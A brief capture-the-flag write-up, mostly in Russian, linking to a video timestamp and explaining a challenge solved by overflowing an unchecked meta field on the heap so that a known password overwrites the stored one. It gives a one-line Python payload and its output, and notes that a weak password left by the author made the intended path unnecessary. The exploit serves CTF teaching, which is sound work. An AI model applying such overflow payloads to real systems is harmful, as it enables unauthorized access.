На видео: [1:15:39](https://vk.com/video-114366489_456239197?t=1h15m39s)

Передать верный логин-пароль, либо переписать на куче

There is no control of meta field reading length. Exploit:
```
>>> print('a'*256+'*'*12+'password')
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa************password
```

На самом деле, автор забыл сменить пароль на более сложный, что упростило работу. При intended решении задания с ним маловероятно справился бы кто-то из игравших.